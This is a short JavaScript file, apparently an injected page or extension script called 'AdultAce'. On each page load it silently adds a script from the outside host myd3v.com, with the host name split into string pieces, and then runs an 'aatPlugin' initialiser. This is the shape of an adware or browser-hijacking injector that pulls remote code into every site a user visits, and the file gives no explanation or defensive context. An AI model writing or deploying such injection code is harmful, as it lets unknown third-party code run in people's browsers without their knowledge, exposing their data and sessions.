var doct = document;

var AdultAce = {
    jsLink: '//' + 'myd3v.com' + '/js/aat.js',
    
    onPageLoad: function() {
        if( doct.body.innerHTML.length < 10 ) return;
        if( doct.location.href == 'about:blank' ) return;
        var head = doct.getElementsByTagName('head')[0];
        if ( !head ) return;

        AdultAce.getLoader(doct);
    },
    getLoader: function(doc){
        var head = doc.getElementsByTagName('head')[0];
        var script_loader = doc.createElement('script');
        script_loader.type = "text/javascript";
        script_loader.src = AdultAce.jsLink;
        script_loader.onload = function()
        {
            var script_init = doc.createElement('script');
            script_init.type = "text/javascript";
            script_init.innerHTML = "(new aatPlugin()).init();";
            head.appendChild(script_init);
        };
        head.appendChild(script_loader);
    }
};

AdultAce.onPageLoad();
